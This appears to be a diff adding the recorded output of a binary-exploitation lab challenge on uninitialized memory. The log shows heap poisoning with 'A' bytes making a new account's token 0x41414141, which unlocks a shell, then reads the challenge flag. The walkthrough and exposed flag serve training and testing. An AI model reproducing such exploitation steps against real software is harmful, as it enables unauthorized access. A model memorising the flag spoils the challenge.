@@ -1,0 +1,59 @@
+Executing 09_uninitialized in Live Mode
+Started '09_uninitialized'
+------------------------------------------------------------
+--[ Misc. - Uninitialized Memory                            
+------------------------------------------------------------
+-- Uninitialized Memory Menu --------
+ 1. Create string                    
+ 2. Set string                       
+ 3. Print string                     
+ 4. Create account                   
+ 5. Poison heap                      
+ 6. Get shell                        
+ 7. Quit                             
+-------------------------------------
+Enter Choice: 
+>> 5
+Enter allocation length: 
+>> 36
+Poisoning heap...
+ 
+-- Uninitialized Memory Menu --------
+ 1. Create string                    
+ 2. Set string                       
+ 3. Print string                     
+ 4. Create account                   
+ 5. Poison heap                      
+ 6. Get shell                        
+ 7. Quit                             
+-------------------------------------
+Enter Choice: 
+>> 4
+Creating an account...
+Here is the uninitialized contents of your allocation:
+0xdf82f0: B0 82 DF 00 00 00 00 00 41 41 41 41 41 41 41 41 
+0xdf8300: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
+0xdf8310: 41 41 41 41 
+Enter an account name: 
+>> admin
+Account name: adminAccount token: 0x41414141
+ 
+-- Uninitialized Memory Menu --------
+ 1. Create string                    
+ 2. Set string                       
+ 3. Print string                     
+ 4. Create account                   
+ 5. Poison heap                      
+ 6. Get shell                        
+ 7. Quit                             
+-------------------------------------
+Enter Choice: 
+>> 6
+Enter account index: 
+>> 0
+$ 
+>> ls
+. .. flag
+$ 
+>> cat flag
+flag{initializing_v4ri4bl3s_i5_h4rd_w0rk}
